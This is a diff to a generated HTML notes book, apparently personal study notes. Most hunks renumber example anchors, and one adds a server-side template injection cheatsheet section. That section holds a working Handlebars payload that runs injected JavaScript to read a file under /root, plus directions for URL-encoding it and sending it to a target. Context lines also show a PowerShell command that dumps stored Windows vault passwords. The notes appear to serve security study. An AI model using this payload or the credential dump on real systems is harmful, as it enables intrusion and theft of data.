@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-aef040ee.js";
+            window.path_to_searchindex_js = "searchindex-6f36b74e.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-0c76121e.js"></script>
+        <script src="toc-ec49e19a.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -215,6 +215,7 @@
 <li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
 <li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
+<li><a href="#server-side-template-injection">server-side template injection</a></li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -650,6 +651,7 @@
 <li><a href="cheatsheets/ssh.html">ssh</a></li>
 <li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
+<li><a href="#server-side-template-injection">server-side template injection</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
@@ -3593,6 +3595,31 @@ $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
 </table>
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server Side Template Injection</a></h1>
+<p>Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious template code into a web application. This can lead to remote code execution, data leakage, and other security issues.</p>
+<h2 id="example-1"><a class="header" href="#example-1">Example:</a></h2>
+<pre><code class="language-handlebars">{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('fs').readFileSync('/root/some-file',{encoding:'utf8',flag:'r'});"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+</code></pre>
+<p>You will first need to encode this payload using URL encoding before sending it to the server. Once encoded, you can include it in a request to the vulnerable web application via a query parameter, form field, or HTTP header, depending on where the SSTI vulnerability exists.</p>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
 <p>Notes related to various cloud service providers.</p>
 <h2 id="directory-map-1"><a class="header" href="#directory-map-1">Directory Map</a></h2>
@@ -3733,7 +3760,7 @@ $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
 <li>YAML or JSON</li>
 <li>CloudFormation templates can be visualized using Application Composer</li>
 </ul>
-<h2 id="example-1"><a class="header" href="#example-1">Example</a></h2>
+<h2 id="example-2"><a class="header" href="#example-2">Example</a></h2>
 <pre><code>---
 Resources:
   MyInstance:
@@ -12724,7 +12751,7 @@ $params = @{
 <li>Reduces the number of rules that need to be created</li>
 <li>Allows for more granular control over network security group rules</li>
 </ul>
-<h2 id="example-2"><a class="header" href="#example-2">Example</a></h2>
+<h2 id="example-3"><a class="header" href="#example-3">Example</a></h2>
 <ul>
 <li>Create an ASG</li>
 <li>Add VMs to the ASG</li>
@@ -14357,7 +14384,7 @@ func main() {
 </li>
 <li>Because of the constraints listed above, binary trees are ordered ‘by default’, making them very performant.</li>
 </ul>
-<h4 id="example-3"><a class="header" href="#example-3">Example:</a></h4>
+<h4 id="example-4"><a class="header" href="#example-4">Example:</a></h4>
 <pre><code class="language-python">import random
 
 class User:
@@ -20089,7 +20116,7 @@ func main() {
 <p>The token bucket rate limiting algorithm is a popular method for rate limiting, used by companies like Amazon and Stripe.</p>
 <p>A token bucket is a container that has a pre-defined capacity. Tokens are put in the bucket at preset rates periodically. Once the bucket is full, no more tokens are added. Each request consumes one token. When a request arrives, we first check if there are available tokens in the bucket. If there are no tokens available, the request is denied.</p>
 <p>The token bucket algorithm takes two parameters. Bucket size (the number of tokens the bucket can store) and refill rate (number of tokens put into the bucket every second).</p>
-<h3 id="example-4"><a class="header" href="#example-4">Example:</a></h3>
+<h3 id="example-5"><a class="header" href="#example-5">Example:</a></h3>
 <pre><code class="language-go">package main
 
 import (
@@ -23573,7 +23600,7 @@ similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="ip"><a class="header" href="#ip">ip</a></h1>
 <p>Show IP stack Info</p>
-<h4 id="example-5"><a class="header" href="#example-5">Example</a></h4>
+<h4 id="example-6"><a class="header" href="#example-6">Example</a></h4>
 <pre><code>$ ip addr
 1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -25187,7 +25214,7 @@ done
 <p>Each Metasploit module follows a structured naming convention:</p>
 <pre><code>&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
 </code></pre>
-<h3 id="example-6"><a class="header" href="#example-6">Example</a></h3>
+<h3 id="example-7"><a class="header" href="#example-7">Example</a></h3>
 <pre><code>794   exploit/windows/ftp/scriptftp_list
 </code></pre>
 <h3 id="components-explained"><a class="header" href="#components-explained">Components Explained</a></h3>
